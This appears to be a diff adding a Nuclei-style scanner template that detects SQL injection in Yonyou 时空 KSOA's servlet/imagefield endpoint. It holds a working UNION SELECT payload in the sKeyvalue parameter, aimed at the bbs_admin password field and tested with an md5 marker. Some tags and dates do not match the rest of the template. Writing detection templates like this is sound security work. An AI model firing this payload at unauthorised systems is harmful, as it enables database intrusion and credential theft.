@@ -1,0 +1,30 @@
+id: 用友时空 KSOA servletimagefield 文件 sKeyvalue 参数SQL 注入
+time: "2023-05-22"
+info:
+  severity: critical
+  description: 用友时空 KSOA servletimagefield 文件 sKeyvalue 参数SQL 注入
+  remediation: Apply the appropriate patch.
+  tags: zhiyuan,rce,fileupload,seeyon,intrusive
+  fofa: app="用友-时空KSOA"
+  metadata:
+    max-request: 1
+
+http:
+  - method: 
+      - GET
+
+    path:
+      - "{{BaseURL}}/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27+union+select+sys.fn_varbintohexstr(hashbytes(%27md5%27,%27test%27))--+"
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "0x098f6bcd4621d373cade4e832627b4f6"
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/02/04
